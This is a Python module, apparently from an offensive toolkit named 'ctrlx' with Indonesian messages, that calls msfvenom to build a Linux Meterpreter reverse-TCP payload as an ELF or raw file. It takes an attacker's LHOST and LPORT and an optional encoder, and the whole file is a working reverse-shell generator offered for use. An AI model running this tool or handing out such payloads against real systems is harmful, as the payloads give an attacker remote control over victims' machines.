import argparse
import subprocess
import os

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx axt --type l0x",
        description="Generate Linux reverse shell payload (.elf) using msfvenom",
        epilog="Contoh: python ctrlx.py axt --type l0x --lhost 192.168.1.5 --lport 5555 --format elf --save"
    )

    parser.add_argument("--lhost", required=True, help="IP address for reverse connection")
    parser.add_argument("--lport", required=True, help="Port for reverse connection")
    parser.add_argument("--format", default="elf", choices=["elf", "raw"], help="Output format (default: elf)")
    parser.add_argument("--encoder", help="Optional encoder for msfvenom")
    parser.add_argument("--out", help="Optional output filename (only used if saved manually)")

    args = parser.parse_args(raw_args)

    out_filename = args.out or f"payload_{args.lhost.replace('.', '_')}_{args.lport}.{args.format}"
    out_path = os.path.join("output", "axt", out_filename)
    os.makedirs(os.path.dirname(out_path), exist_ok=True)

    cmd = [
        "msfvenom",
        "-p", "linux/x86/meterpreter/reverse_tcp",
        f"LHOST={args.lhost}",
        f"LPORT={args.lport}",
        "-f", args.format,
        "-o", out_path
    ]
    if args.encoder:
        cmd.extend(["-e", args.encoder])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            return f"[✔] Payload berhasil dibuat:\n{out_path}\n\n[📤] msfvenom Output:\n{result.stdout}"
        else:
            return f"[✖] Gagal membuat payload:\n{result.stderr}"
    except FileNotFoundError:
        return "[!] msfvenom tidak ditemukan. Pastikan Metasploit Framework sudah terinstall."
    except Exception as e:
        return f"[!] Error saat menjalankan msfvenom: {e}"
